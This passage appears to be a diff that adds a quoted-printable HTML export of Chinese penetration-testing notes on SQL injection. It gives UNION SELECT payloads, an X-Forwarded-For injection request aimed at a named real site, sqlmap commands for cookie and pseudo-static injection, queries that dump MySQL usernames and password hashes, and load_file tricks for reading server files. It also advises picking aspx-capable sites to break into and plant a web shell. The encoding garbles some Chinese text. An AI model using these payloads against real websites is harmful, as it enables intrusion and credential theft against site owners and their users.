+   <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-si=
+ze:11.0pt'>得到占几个字段：</p>
+   </td>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:5.7569in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-si=
+ze:11.0pt'><span
+   lang=3Den-US>and 1=3D2 union select 1,2,3,4,5,6,7,* from admin<span
+   style=3D'mso-spacerun:yes'>  </span>13-7=3D6</span><span lang=3Dzh-CN>�=
+��字段</span><span
+   lang=3Den-US><span style=3D'mso-spacerun:yes'>  </span>13-6*2=3D1</span=
+></p>
+   </td>
+  </tr>
+  <tr>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:1.4347in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-si=
+ze:11.0pt'>最终结果：</p>
+   </td>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:5.8458in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-si=
+ze:11.0pt'
+   lang=3Den-US>and 1=3D2 union select 1,*<span style=3D'mso-spacerun:yes'>=
+ 
+   </span>from (admin as a inner join admin as b on a.id=3Db.id)</p>
+   </td>
+  </tr>
+ </table>
+ </div>
+ <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-size=
+:11.0pt;
+ color:red' lang=3Den-US>&nbsp;</p>
+ <p style=3D'color:#000000;margin:0in;line-height:25pt;text-indent:-.1666in;
+ font-family:微软雅黑;font-size:11.0pt;color:red'><img
+ src=3D"file8792.files/image001.png" width=3D16 height=3D16 alt=3D重要>&n=
+bsp;<span
+ style=3D'font-weight:bold' lang=3Dzh-CN>【</span><span style=3D'font-weig=
+ht:bold'
+ lang=3Den-US>HTTP</span><span style=3D'font-weight:bold' lang=3Dzh-CN>头�=
+��入】</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'><span
+ lang=3Dzh-CN>包括</span><span lang=3Den-US>ua</span><span lang=3Dzh-CN>�=
+��</span><span
+ lang=3Den-US>xforword</span><span lang=3Dzh-CN>，</span><span lang=3Den-U=
+S>cookie</span><span
+ lang=3Dzh-CN>等等</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'>&nbsp;</p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'><span
+ style=3D'font-weight:bold'>X-Forwarded-For注入：</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'>GET
+ /click.php?ID=3D1121&amp;RedirectUrl=3Dhttp%3A%2F%2Fs.yingjiesheng.com%2F =
+HTTP/1.1</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'>Host:
+ <a href=3D"http://www.yingjiesheng.com">www.yingjiesheng.com</a></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'>User-Agent:
+ Mozilla/5.0 (Windows NT 6.3; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0</=
+p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'>Accept:
+ text/html,application/xhtml+xml,application/xml;q=3D0.9,*/*;q=3D0.8</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'>Accept-Language:
+ zh-cn,zh;q=3D0.8,en-us;q=3D0.5,en;q=3D0.3</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'>Accept-Encoding:
+ gzip, deflate</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'>X-Forwarded-For:
+ 27.27.27.27'+if((1=3D1 *),(select 1 union select 2),(1=3D1)) + '</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'>Connection:
+ close</p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'>&nbsp;</p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'><span
+ style=3D'font-weight:bold' lang=3Den-US>cookie</span><span style=3D'font-w=
+eight:
+ bold' lang=3Dzh-CN>注入：</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'
+ lang=3Den-US>Sqlmap -u xxx.com/xxx.asp --level 2 --cookie id=3D133</p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'>&nbsp;</p>
+ <p style=3D'color:#000000;margin:0in;line-height:25pt;text-indent:-.1666in;
+ font-family:微软雅黑;font-size:11.0pt;color:red'><img
+ src=3D"file8792.files/image002.png" width=3D16 height=3D16 alt=3D分类>&n=
+bsp;<span
+ style=3D'font-weight:bold'>【 旁注 】</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'><span lang=3Dzh-CN>旁注的技巧就是挑选支持</sp=
+an><span lang=3Den-US>aspx</span><span
+ lang=3Dzh-CN>的站来日，这样提权时候希望较大，如何探测�=
+��务器上哪些站点支持</span><span lang=3Den-US>aspx</span><span
+ lang=3Dzh-CN>呢</span><span lang=3Den-US>? </span><span lang=3Dzh-CN>利�=
+��</span><span
+ lang=3Den-US>bing</span><span lang=3Dzh-CN>搜索：</span><span lang=3Den=
+-US>http://cn.bing.com/
+ </span><span lang=3Dzh-CN>搜索格式：</span><span lang=3Den-US>ip:</sp=
+an><span
+ lang=3Dzh-CN>服务器</span><span lang=3Den-US>ip aspx</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'><span lang=3Dzh-CN>比如要入侵一个网站，想知�=
+��该网站支不支持</span><span
+ lang=3Den-US>aspx</span><span lang=3Dzh-CN>，</span><span style=3D'backgr=
+ound:yellow;
+ mso-highlight:yellow' lang=3Dzh-CN>就在网站后面随便加上一个</s=
+pan><span style=3D'background:
+ yellow;mso-highlight:yellow' lang=3Den-US>xxx.aspx</span><span style=3D'ba=
+ckground:
+ yellow;mso-highlight:yellow' lang=3Dzh-CN>回车，如果显示的不是</=
+span><span
+ style=3D'background:yellow;mso-highlight:yellow' lang=3Den-US>iis</span><s=
+pan
+ style=3D'background:yellow;mso-highlight:yellow' lang=3Dzh-CN>默认的错=
+误页面，而是这种：“</span><span
+ style=3D'background:yellow;mso-highlight:yellow' lang=3Den-US>/</span><span
+ style=3D'background:yellow;mso-highlight:yellow' lang=3Dzh-CN>”应用程=
+序中的服务器错误，说明支持</span><span
+ style=3D'background:yellow;mso-highlight:yellow' lang=3Den-US>aspx</span><=
+span
+ style=3D'background:yellow;mso-highlight:yellow' lang=3Dzh-CN>马</span></=
+p>
+ <p style=3D'color:#000000;margin:0in;line-height:25pt;text-indent:-.1666in;
+ font-family:微软雅黑;font-size:11.0pt;color:red'><img
+ src=3D"file8792.files/image002.png" width=3D16 height=3D16 alt=3D分类>&n=
+bsp;<span
+ style=3D'font-weight:bold'>【 伪静态注入 】</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'>普通网页</p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt' lang=3Den-US><a href=3D"http://www.91ri.org/news.php?id=
+=3D111">http://www.91ri.org/news.php?id=3D111</a></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'>做了伪静态之后就成这样了：</p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt' lang=3Den-US><a href=3D"http://www.91ri.org/news.php/id/=
+111.html">http://www.91ri.org/news.php/id/111.html</a></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'><span lang=3Dzh-CN>以斜杠“</span><span lang=3Den-US=
+>/</span><span
+ lang=3Dzh-CN>”代替了“</span><span lang=3Den-US>=3D</span><span lang=
+=3Dzh-CN>”并在最后加上</span><span
+ lang=3Den-US>.html</span><span lang=3Dzh-CN>，这样一来，就无法直=
+接用工具来注入了。</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'><span lang=3Dzh-CN>常规的伪静态页面如下：</sp=
+an><span lang=3Den-US>http://www.XXX.com/play/Diablo.html</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'><span lang=3Dzh-CN>例如关联的动态页面是</span>=
+<span lang=3Den-US>game.php </span><span
+ lang=3Dzh-CN>，那么当用户访问后程序会自动转换成类似</sp=
+an><span lang=3Den-US>http://www.XXX.com/game.php?action=3Dplay&amp;name=3D=
+Diablo
+ </span><span lang=3Dzh-CN>的形式</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'><span lang=3Dzh-CN>注入点检测可以用：</span><sp=
+an lang=3Den-US>http://www.XXX.com/play/Diablo*
+ and 1=3D*1.html</span><span lang=3Dzh-CN>与</span><span lang=3Den-US>http=
+://www.XXX.com/play/Diablo*
+ and 1=3D*</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'><span lang=3Den-US>Sqlmap -u<span style=3D'mso-spacerun:=
+yes'> 
+ </span></span><a href=3D"http://www.91ri.org/news.php/id/111*.html"><span
+ lang=3Den-US>http://www.91ri.org/news.php/id/111*.html</span></a><span
+ lang=3Den-US><span style=3D'mso-spacerun:yes'>   </span></span><span lan=
+g=3Dzh-CN>在</span><span
+ lang=3Den-US>111</span><span lang=3Dzh-CN>后面添加星号进行伪静�=
+�注入</span></p>
+ <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-size=
+:11.0pt'
+ lang=3Den-US>&nbsp;</p>
+ <p style=3D'color:#000000;margin:0in;line-height:25pt;text-indent:-.1666in;
+ font-family:微软雅黑;font-size:11.0pt;color:red'><img
+ src=3D"file8792.files/image002.png" width=3D16 height=3D16 alt=3D分类>&n=
+bsp;<span
+ style=3D'font-weight:bold' lang=3Dzh-CN>【</span><span style=3D'font-weig=
+ht:bold'
+ lang=3Den-US>Base64</span><span style=3D'font-weight:bold' lang=3Dzh-CN>�=
+�入】</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'><span lang=3Den-US>Php?id=3D13<span style=3D'mso-spaceru=
+n:yes'>  
+ </span></span><span lang=3Dzh-CN>普通关键字</span><span lang=3Den-US>=
+<span
+ style=3D'mso-spacerun:yes'>      </span>php?id=3DMTM=3D<span
+ style=3D'mso-spacerun:yes'>   </span>Base64</span><span lang=3Dzh-CN>加=
+密后关键字</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'><span lang=3Den-US>Php?id=3D13'<span
+ style=3D'mso-spacerun:yes'>      </span>php?id=3DMTMn<span
+ style=3D'mso-spacerun:yes'>  </span></span><span lang=3Dzh-CN>将</span><=
+span
+ lang=3Den-US>id=3Dxxx</span><span lang=3Dzh-CN>变成为</span><span lang=
+=3Den-US>id=3Dbase64</span><span
+ lang=3Dzh-CN>加密后的数据。</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;line-height:25pt;font-family:微=
+软雅黑;
+ font-size:11.0pt'><span lang=3Den-US>Base64</span><span lang=3Dzh-CN>编�=
+�不能用</span><span
+ lang=3Den-US> '+' </span><span lang=3Dzh-CN>或</span><span lang=3Den-US> =
+'%20' </span><span
+ lang=3Dzh-CN>来代替空格</span></p>
+ <p style=3D'color:#000000;margin:0in;line-height:25pt;text-indent:-.1666in;
+ font-family:微软雅黑;font-size:11.0pt;color:red'><img
+ src=3D"file8792.files/image002.png" width=3D16 height=3D16 alt=3D分类>&n=
+bsp;<span
+ style=3D'font-weight:bold' lang=3Dzh-CN>【</span><span style=3D'font-weig=
+ht:bold'
+ lang=3Den-US>Mysql</span><span style=3D'font-weight:bold' lang=3Dzh-CN>注=
+入语句】</span></p>
+ <ul type=3Ddisc style=3D'margin-left:.375in;direction:ltr;unicode-bidi:emb=
+ed;
+  margin-top:0in;margin-bottom:0in'>
+  <li style=3D'margin-top:0;margin-bottom:0;vertical-align:middle;line-heig=
+ht:
+      25pt'><span style=3D'font-weight:bold;font-family:微软雅黑;font-s=
+ize:11.0pt'
+      lang=3Den-US>M</span><span style=3D'font-weight:bold;font-family:微�=
+��雅黑;
+      font-size:11.0pt' lang=3Dzh-CN>ysql基础</span></li>
+ </ul>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:微�=
+��雅黑;
+ font-size:11.0pt'><span lang=3Den-US>1. mysql5.0以后<span
+ style=3D'mso-spacerun:yes'>  </span>information.schema库出现</span><sp=
+an
+ lang=3Dzh-CN>可以快速查询内容</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:微�=
+��雅黑;
+ font-size:11.0pt'><span lang=3Dzh-CN>2. mysql5.1以后</span><span lang=3D=
+en-US> udf
+ 导入xx\lib\plugin\ 目录下</span><span lang=3Dzh-CN>，之前的要放=
+到</span><span lang=3Den-US>system</span><span
+ lang=3Dzh-CN>目录中</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:微�=
+��雅黑;
+ font-size:11.0pt'><span lang=3Dzh-CN>3.mysql5.x以后</span><span lang=3De=
+n-US>
+ system执行命令</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:微�=
+��雅黑;
+ font-size:11.0pt'><span lang=3Dzh-CN>mysql4.x或</span><span lang=3Den-US>=
+5.x中都有一个名字叫“mysql”的数据库，user表中user字段�=
+�用户登录名，password字段中为密码哈希，40位md5加密值，h=
+ost字段中是这个用户可以在哪个机器上登录，localhost只能=
+在本地登录，file_priv规定了用户是不是可以读取硬盘上的=
+东西Y表示允许。</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:微�=
+��雅黑;
+ font-size:11.0pt'><span lang=3Den-US>/**/,(),+<span style=3D'mso-spacerun:=
+yes'>  
+ </span></span><span lang=3Dzh-CN>代表空格</span><span lang=3Den-US>,/*=
+*/</span><span
+ lang=3Dzh-CN>是</span><span lang=3Den-US>mysql</span><span lang=3Dzh-CN>�=
+��有的特性，其他数据库不支持。</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:微�=
+��雅黑;
+ font-size:11.0pt'><span lang=3Den-US>#<span style=3D'mso-spacerun:yes'> 
+ </span>/*<span style=3D'mso-spacerun:yes'>   </span>-- -<span
+ style=3D'mso-spacerun:yes'>     </span>;%00<span style=3D'mso-spacerun=
+:yes'>     
+ </span>`<span style=3D'mso-spacerun:yes'>   </span></span><span lang=3Dz=
+h-CN>代表注释</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:微�=
+��雅黑;
+ font-size:11.0pt'><span lang=3Den-US>Concat(),group_concat(),concat_ws()<s=
+pan
+ style=3D'mso-spacerun:yes'>   </span></span><span lang=3Dzh-CN>多行显=
+示</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'>group_concat(char(60,112,62),table_name)可进行换行显示</p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Den-US>Mysql</span><span lang=3Dzh-CN>错误回显注入</span><span=
+ lang=3Den-US> </span><span
+ lang=3Dzh-CN>通常用于无显示位回显</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'>&nbsp;</p>
+ <ul type=3Ddisc style=3D'margin-left:.375in;direction:ltr;unicode-bidi:emb=
+ed;
+  margin-top:0in;margin-bottom:0in'>
+  <li style=3D'margin-top:0;margin-bottom:0;vertical-align:middle;line-heig=
+ht:
+      25pt'><span style=3D'font-weight:bold;font-family:微软雅黑;font-s=
+ize:11.0pt'>怎么获取到网站根路径？</span></li>
+ </ul>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:微�=
+��雅黑;
+ font-size:11.0pt'>谷歌黑客 site:5hchina.com warning</p>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:微�=
+��雅黑;
+ font-size:11.0pt'>文件报错</p>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:微�=
+��雅黑;
+ font-size:11.0pt'>查看敏感文件 info.php phpinfo.php test.php</p>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-size:11.0pt=
+'><span
+ style=3D'font-family:微软雅黑' lang=3Dzh-CN>通过</span><span style=
+=3D'font-family:Calibri'
+ lang=3Den-US>sql</span><span style=3D'font-family:微软雅黑' lang=3Dzh-=
+CN>注入读取</span><span
+ style=3D'font-family:Calibri' lang=3Den-US>php</span><span style=3D'font-f=
+amily:
+ 微软雅黑' lang=3Dzh-CN>的配置文件</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:微�=
+��雅黑;
+ font-size:11.0pt'>&nbsp;</p>
+ <div style=3D'direction:ltr'>
+ <table border=3D1 cellpadding=3D0 cellspacing=3D0 valign=3Dtop style=3D'di=
+rection:ltr;
+  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-w=
+idth:
+  1pt;margin-left:.7083in'>
+  <tr>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:.9527in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-si=
+ze:11.0pt'>version()<span
+   style=3D'mso-spacerun:yes'>  </span></p>
+   </td>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:1.2819in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-si=
+ze:11.0pt'>版本</p>
+   </td>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:1.2215in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-si=
+ze:11.0pt'>system_user()</p>
+   </td>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:1.5875in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-si=
+ze:11.0pt'>系统用户名</p>
+   </td>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:1.0479in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-si=
+ze:11.0pt'>load_file()</p>
+   </td>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:1.5979in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-si=
+ze:11.0pt'>MYSQL读取本地文件</p>
+   </td>
+  </tr>
+  <tr>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:.9527in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-si=
+ze:11.0pt'>database()
+   </p>
+   </td>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:1.2819in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-si=
+ze:11.0pt'>当前数据库</p>
+   </td>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:1.2215in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-si=
+ze:11.0pt'><span
+   lang=3Dzh-CN>current_user</span><span lang=3Den-US>()</span></p>
+   </td>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:1.5875in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-si=
+ze:11.0pt'>当前用户名</p>
+   </td>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:1.0673in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-si=
+ze:11.0pt'>@@datadir</p>
+   </td>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:1.4937in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-si=
+ze:11.0pt'>读取数据库路径</p>
+   </td>
+  </tr>
+  <tr>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:.9333in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-si=
+ze:11.0pt'>user()
+   </p>
+   </td>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:1.2819in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-si=
+ze:11.0pt'>当前用户</p>
+   </td>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:1.2215in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-si=
+ze:11.0pt'>session_user()</p>
+   </td>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:1.6069in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-si=
+ze:11.0pt'>连接数据库的用户名</p>
+   </td>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:1.0673in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-si=
+ze:11.0pt'>@@basedir</p>
+   </td>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:1.4937in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;line-height:25pt;font-family:微软雅黑;font-si=
+ze:11.0pt'>MYSQL
+   安装路径</p>
+   </td>
+  </tr>
+  <tr>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:.9333in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;font-family:微软雅黑;font-size:11.0pt' lang=
+=3Den-US>length</p>
+   </td>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:1.3013in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;font-family:微软雅黑;font-size:11.0pt'>返回=
+字符串长度</p>
+   </td>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:1.202in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;font-family:微软雅黑;font-size:11.0pt' lang=
+=3Den-US>substring</p>
+   </td>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:1.5875in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;font-family:微软雅黑;font-size:11.0pt'>截取=
+字符串长度</p>
+   </td>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:1.0479in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;font-family:微软雅黑;font-size:11.0pt' lang=
+=3Den-US>ascii</p>
+   </td>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:1.3229in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;font-family:微软雅黑;font-size:11.0pt'><span =
+lang=3Dzh-CN>返回</span><span
+   lang=3Den-US>ascii</span><span lang=3Dzh-CN>码</span></p>
+   </td>
+  </tr>
+  <tr>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:.9333in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;font-family:微软雅黑;font-size:11.0pt' lang=
+=3Den-US>hex</p>
+   </td>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:1.2819in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;font-family:微软雅黑;font-size:11.0pt'>十六=
+进制转换</p>
+   </td>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:1.202in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;font-family:微软雅黑;font-size:11.0pt' lang=
+=3Den-US>md5</p>
+   </td>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:1.5875in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;font-family:微软雅黑;font-size:11.0pt'><span =
+lang=3Dzh-CN>返回</span><span
+   lang=3Den-US>md5</span><span lang=3Dzh-CN>值</span></p>
+   </td>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:1.0479in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;font-family:微软雅黑;font-size:11.0pt' lang=
+=3Den-US>&nbsp;</p>
+   </td>
+   <td style=3D'border-style:solid;border-color:#A3A3A3;border-width:1pt;
+   vertical-align:top;width:1.2159in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
+   <p style=3D'margin:0in;font-family:微软雅黑;font-size:11.0pt'>&nbsp;=
+</p>
+   </td>
+  </tr>
+ </table>
+ </div>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:微�=
+��雅黑;
+ font-size:11.0pt'><span lang=3Dzh-CN>当</span><span lang=3Den-US>user()</=
+span><span
+ lang=3Dzh-CN>出错时可以使用</span><span lang=3Den-US>@@user</span><=
+span lang=3Dzh-CN>来进行查看</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Dzh-CN>当能显示显示位却不能显示数据的时候通常是�=
+��为数据编码的格式问题使用</span><span lang=3Den-US>hex</span><=
+span
+ lang=3Dzh-CN>解决</span><span lang=3Den-US> </span><span lang=3Dzh-CN>�=
+�还有一种方法是通过子查询注入来获取。</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Den-US><span style=3D'mso-spacerun:yes'> </span></span><span lang=
+=3Dzh-CN>id=3D1+and+1=3D2+union+select+1,2,3,4,5,hex(concat(database(),0x5f=
+5f,user(),0x5f5f,version())),7/*</span></p>
+ <p style=3D'margin:0in;margin-left:.75in;font-family:微软雅黑;font-siz=
+e:11.0pt'><span
+ lang=3Dzh-CN>CONVERT(group_concat(DISTINCT+user,0x3a,password,0x3a,host)+U=
+SING+latin1)</span><span
+ lang=3Den-US><span style=3D'mso-spacerun:yes'>   </span></span><span lan=
+g=3Dzh-CN>或者使用这种方法</span></p>
+ <p style=3D'margin:0in;margin-left:.375in;font-family:微软雅黑;font-si=
+ze:11.0pt'>&nbsp;</p>
+ <ul type=3Ddisc style=3D'margin-left:.375in;direction:ltr;unicode-bidi:emb=
+ed;
+  margin-top:0in;margin-bottom:0in'>
+  <li style=3D'margin-top:0;margin-bottom:0;vertical-align:middle;line-heig=
+ht:
+      25pt'><span style=3D'font-weight:bold;font-family:微软雅黑;font-s=
+ize:11.0pt'>读取文件技巧：</span></li>
+ </ul>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:微�=
+��雅黑;
+ font-size:11.0pt'>load_file(char(32,26,56,66))</p>
+ <p style=3D'margin:0in;margin-left:.75in;line-height:25pt;font-family:微�=
+��雅黑;
+ font-size:11.0pt'><span lang=3Dzh-CN>load_file(0x633A5C626F6F742E696E69)</=
+span><span
